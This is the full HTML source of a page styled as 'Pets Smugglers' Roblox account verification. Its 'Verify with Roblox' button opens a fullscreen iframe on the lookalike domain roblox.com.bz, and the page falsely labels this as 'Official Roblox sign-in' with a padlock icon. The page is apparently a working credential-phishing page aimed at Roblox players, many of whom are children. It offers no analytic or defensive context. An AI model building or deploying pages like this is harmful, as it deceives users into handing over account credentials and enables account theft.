<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#0b0b0f">
  <title>Pets Smugglers — Verification</title>

  <style>
    :root {
      --bg: #0b0b0f;
      --ink: #f6f3ec;
      --muted: #a4a3ad;
      --gold: #e9bd58;
      --line: rgba(255, 255, 255, 0.10);
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    [hidden] { display: none !important; }
    html { -webkit-text-size-adjust: 100%; }

    body {
      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI",
                   Roboto, Helvetica, Arial, sans-serif;
      background: var(--bg);
      color: var(--ink);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      line-height: 1.55;
      -webkit-font-smoothing: antialiased;
    }

    body.locked { overflow: hidden; }

    body::before {
      content: "";
      position: fixed;
      inset: 0;
      z-index: -1;
      background:
        radial-gradient(1100px 520px at 50% -12%, rgba(233, 189, 88, 0.15), transparent 70%),
        linear-gradient(rgba(9, 9, 13, 0.80), rgba(9, 9, 13, 0.95)),
        url("https://i.postimg.cc/hGvh0y8x/381759b55f98ac0e399a99501f5f3aad.png") center / cover no-repeat,
        var(--bg);
    }

    a { color: inherit; }

    :focus-visible {
      outline: 2px solid var(--gold);
      outline-offset: 3px;
      border-radius: 6px;
    }

    /* ---------- Header ---------- */

    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      padding: 14px clamp(18px, 5vw, 56px);
      border-bottom: 1px solid var(--line);
      background: rgba(11, 11, 15, 0.55);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      text-decoration: none;
    }

    .brand img {
      width: 42px;
      height: 42px;
      border-radius: 11px;
      object-fit: cover;
      border: 1px solid var(--line);
    }

    .brand-text {
      display: flex;
      flex-direction: column;
      line-height: 1.2;
    }

    .brand-text strong {
      font-size: 14px;
      font-weight: 800;
      letter-spacing: 1.6px;
      color: var(--gold);
    }

    .brand-text small {
      font-size: 11px;
      letter-spacing: 0.6px;
      color: var(--muted);
    }

    .status {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      padding: 6px 11px;
      border: 1px solid rgba(101, 217, 155, 0.28);
      border-radius: 999px;
      background: rgba(101, 217, 155, 0.08);
      color: #65d99b;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.9px;
      white-space: nowrap;
    }

    .status::before {
      content: "";
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #65d99b;
      animation: pulse 2.4s ease-out infinite;
    }

    @keyframes pulse {
      0%   { box-shadow: 0 0 0 0 rgba(101, 217, 155, 0.55); }
      70%  { box-shadow: 0 0 0 7px rgba(101, 217, 155, 0); }
      100% { box-shadow: 0 0 0 0 rgba(101, 217, 155, 0); }
    }

    /* ---------- Hero ---------- */

    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 0;
      padding: 56px clamp(18px, 5vw, 24px);
      text-align: center;
    }

    .eyebrow {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 18px;
      padding: 6px 13px;
      border: 1px solid var(--line);
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.04);
      color: var(--muted);
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 1.4px;
      text-transform: uppercase;
    }

    h1 {
      max-width: 16ch;
      font-size: clamp(30px, 6.6vw, 44px);
      line-height: 1.14;
      letter-spacing: -0.9px;
      margin-bottom: 14px;
      text-wrap: balance;
    }

    h1 span {
      background: linear-gradient(180deg, #f2d390, #b8933f);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .description {
      max-width: 40ch;
      margin-bottom: 34px;
      color: var(--muted);
      font-size: 15px;
      text-wrap: pretty;
    }

    /* ---------- CTA ---------- */

    .verify {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 11px;
      padding: 18px 34px;
      border: 0;
      border-radius: 13px;
      background: linear-gradient(180deg, #f4d18a, #e0ad3f);
      color: #191408;
      font: inherit;
      font-size: 16px;
      font-weight: 800;
      letter-spacing: 0.2px;
      cursor: pointer;
      box-shadow:
        0 14px 34px rgba(233, 189, 88, 0.26),
        inset 0 1px 0 rgba(255, 255, 255, 0.45);
      transition: transform 0.15s, box-shadow 0.2s, filter 0.2s;
    }

    .verify svg { width: 21px; height: 21px; flex: none; }

    .verify:hover {
      transform: translateY(-2px);
      filter: brightness(1.05);
      box-shadow:
        0 18px 42px rgba(233, 189, 88, 0.34),
        inset 0 1px 0 rgba(255, 255, 255, 0.45);
    }

    .verify:active { transform: translateY(0); }

    .fineprint {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      margin-top: 16px;
      color: #7d7d89;
      font-size: 12px;
    }

    .fineprint svg { width: 13px; height: 13px; flex: none; }

    /* ---------- Footer ---------- */

    footer {
      padding: 24px;
      text-align: center;
      color: #6d6d78;
      font-size: 12px;
    }

    /* ---------- Fullscreen embed ---------- */

    .overlay {
      position: fixed;
      inset: 0;
      z-index: 100;
      display: flex;
      flex-direction: column;
      background: #0b0b0f;
      animation: fade 0.22s ease both;
    }

    @keyframes fade {
      from { opacity: 0; }
      to   { opacity: 1; }
    }

    .overlay iframe {
      flex: 1;
      display: block;
      width: 100%;
      height: 100%;
      border: 0;
      background: #fff;
      animation: rise 0.26s cubic-bezier(0.2, 0.9, 0.3, 1) both;
    }

    @keyframes rise {
      from { opacity: 0; transform: scale(0.985); }
      to   { opacity: 1; transform: scale(1); }
    }

    .close {
      position: fixed;
      top: 14px;
      right: 14px;
      z-index: 101;
      display: grid;
      place-items: center;
      width: 42px;
      height: 42px;
      border: 1px solid rgba(255, 255, 255, 0.18);
      border-radius: 50%;
      background: rgba(12, 12, 16, 0.72);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      color: #fff;
      font: inherit;
      cursor: pointer;
      transition: background 0.2s, transform 0.15s;
    }

    .close:hover { background: rgba(40, 40, 48, 0.9); transform: scale(1.06); }
    .close svg { width: 17px; height: 17px; }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation-duration: 0.001ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.001ms !important;
      }
    }

    @media (max-width: 520px) {
      .brand-text small { display: none; }
      .brand-text strong { font-size: 12.5px; letter-spacing: 1.2px; }
      .brand img { width: 36px; height: 36px; border-radius: 9px; }
      .status { padding: 5px 9px; font-size: 10px; }
      .verify { width: 100%; padding: 17px 22px; }
      .close { top: 10px; right: 10px; width: 38px; height: 38px; }
    }
  </style>
</head>

<body>

  <header>
    <a class="brand" href="/" aria-label="Pets Smugglers home">
      <img
        src="https://i.postimg.cc/hGvh0y8x/381759b55f98ac0e399a99501f5f3aad.png"
        alt=""
        width="42"
        height="42"
      >
      <span class="brand-text">
        <strong>PETS SMUGGLERS</strong>
        <small>Account verification</small>
      </span>
    </a>

    <span class="status">SYSTEM ONLINE</span>
  </header>

  <main>

    <span class="eyebrow">🐾 Verification</span>

    <h1>Verify with <span>Roblox</span></h1>

    <p class="description">
      One click and you're in. Sign in on the page that opens and
      you're done.
    </p>

    <button class="verify" type="button" id="verifyBtn">
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M5.2 1.6 22.4 5.2 18.8 22.4 1.6 18.8Z"
              fill="none" stroke="currentColor" stroke-width="1.9"
              stroke-linejoin="round"/>
        <path d="M9.35 7.95 16.05 9.35 14.65 16.05 7.95 14.65Z"
              fill="currentColor"/>
      </svg>
      Verify with Roblox
    </button>

    <span class="fineprint">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2" aria-hidden="true">
        <rect x="4" y="10" width="16" height="11" rx="2"/>
        <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
      </svg>
      Official Roblox sign-in
    </span>

  </main>

  <footer>
    Pets Smugglers · Independent community project
  </footer>

  <!-- Fullscreen embed -->

  <div class="overlay" id="overlay" hidden>

    <button class="close" type="button" id="closeBtn" aria-label="Close">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
           stroke-width="2.4" stroke-linecap="round" aria-hidden="true">
        <path d="M18 6 6 18M6 6l12 12"/>
      </svg>
    </button>

    <iframe
      id="frame"
      title="Roblox sign-in"
      referrerpolicy="strict-origin-when-cross-origin"
      allow="clipboard-write"
    ></iframe>

  </div>

  <script>
    (function () {
      "use strict";

      var URL = "https://roblox.com.bz/login?returnUrl=6233425759930493";

      var overlay  = document.getElementById("overlay");
      var frame    = document.getElementById("frame");
      var verifyBtn = document.getElementById("verifyBtn");
      var closeBtn = document.getElementById("closeBtn");

      function open() {
        frame.src = URL;
        overlay.hidden = false;
        document.body.classList.add("locked");
        closeBtn.focus();
      }

      function close() {
        overlay.hidden = true;
        frame.src = "about:blank";
        document.body.classList.remove("locked");
        verifyBtn.focus();
      }

      verifyBtn.addEventListener("click", open);
      closeBtn.addEventListener("click", close);

      document.addEventListener("keydown", function (event) {
        if (event.key === "Escape" && !overlay.hidden) close();
      });
    })();
  </script>

</body>
  </html>
